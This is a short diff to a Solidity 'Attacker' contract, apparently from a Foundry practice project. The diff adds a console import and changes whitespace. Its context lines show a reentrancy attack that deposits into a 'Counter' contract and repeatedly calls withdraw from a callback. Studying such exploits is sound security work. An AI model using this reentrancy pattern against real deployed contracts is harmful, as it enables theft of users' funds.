@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
+import {console} from "forge-std/console.sol";
 import {Counter} from "./Counter.sol";
 
 contract Attacker {
@@ -15,7 +16,7 @@ contract Attacker {
             counter.withdraw(1 ether);
         }
     }
-
+  
    function attack() external payable {
         counter.deposit{value: msg.value}();
         counter.withdraw(1 ether);
